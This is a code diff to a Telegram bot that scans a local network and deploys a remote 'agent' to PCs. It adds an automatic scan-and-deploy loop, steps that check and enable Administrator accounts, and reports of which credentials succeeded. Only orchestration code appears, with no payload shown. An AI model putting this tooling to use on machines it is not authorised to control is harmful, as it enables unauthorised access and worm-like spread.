@@ -18,9 +18,18 @@ from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, FSInputFil
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 
 from database import Database
-from config import BOT_TOKEN, ADMIN_ID, HTTP_HOST, HTTP_PORT, HEARTBEAT_TIMEOUT, DB_PATH
+from config import (
+    BOT_TOKEN,
+    ADMIN_ID,
+    HTTP_HOST,
+    HTTP_PORT,
+    HEARTBEAT_TIMEOUT,
+    DB_PATH,
+    AUTO_DEPLOY_ENABLED,
+)
 from scanner import scan_network, get_local_ip
 from deployer import deploy_to_pc, deploy_to_multiple, check_credentials
+from auto_deploy import auto_deploy_loop
 
 db = Database(DB_PATH)
 bot = Bot(token=BOT_TOKEN)
@@ -393,16 +402,26 @@ async def cmd_deploy(message: types.Message):
         return
 
     await message.answer(f"📦 Deploying agent to `{ip}`...")
+    await message.answer("🔍 Administrator account tekshirilmoqda...")
 
     try:
-        success = deploy_to_pc(ip, username, password, agent_path)
+        result = deploy_to_pc(ip, username, password, agent_path)
     except Exception as e:
         await message.answer(f"❌ Deployment failed: {str(e)}")
         return
 
+    if isinstance(result, tuple):
+        success, used_user, used_pass = result
+    else:
+        success = result
+        used_user = username
+        used_pass = password
+
     if success:
         await message.answer(
-            f"✅ Agent deployed to `{ip}`! It will connect within 30 seconds."
+            f"✅ Agent deployed to `{ip}`!\n"
+            f"👤 Account: `{used_user}`\n"
+            f"🔗 It will connect within 30 seconds."
         )
     else:
         await message.answer(
@@ -462,6 +481,7 @@ async def cmd_deploy_all(message: types.Message):
         return
 
     await message.answer(f"📦 Deploying to {len(targets)} PCs: {', '.join(targets)}")
+    await message.answer("🔍 Administrator account tekshirilmoqda va yoqilmoqda...")
 
     try:
         results = deploy_to_multiple(targets, username, password, agent_path)
@@ -469,11 +489,15 @@ async def cmd_deploy_all(message: types.Message):
         await message.answer(f"❌ Deployment failed: {str(e)}")
         return
 
-    success_count = sum(1 for v in results.values() if v)
+    success_count = sum(1 for v in results.values() if isinstance(v, tuple) and v[0])
     text = f"📦 **Deployment Complete**\n\n"
     text += f"✅ Success: {success_count}/{len(targets)}\n\n"
-    for ip, ok in results.items():
-        text += f"{'✅' if ok else '❌'} `{ip}`\n"
+    for ip, result in results.items():
+        if isinstance(result, tuple):
+            ok, used_user, _ = result
+            text += f"{'✅' if ok else '❌'} `{ip}` (user: {used_user})\n"
+        else:
+            text += f"❌ `{ip}` (failed)\n"
 
     await message.answer(text, parse_mode="Markdown")
 
@@ -847,11 +871,19 @@ async def check_offline_devices():
 async def on_startup(app):
     app["bot_task"] = asyncio.create_task(dp.start_polling(bot))
     app["offline_task"] = asyncio.create_task(check_offline_devices())
+    if AUTO_DEPLOY_ENABLED:
+        app["auto_deploy_task"] = asyncio.create_task(auto_deploy_loop(bot))
+        print("[*] Auto-deploy enabled. Will scan network and deploy automatically.")
+    else:
+        app["auto_deploy_task"] = None
+        print("[*] Auto-deploy disabled. Use /scan and /deploy manually.")
 
 
 async def on_shutdown(app):
     app["bot_task"].cancel()
     app["offline_task"].cancel()
+    if app.get("auto_deploy_task"):
+        app["auto_deploy_task"].cancel()
     await bot.session.close()
 
 
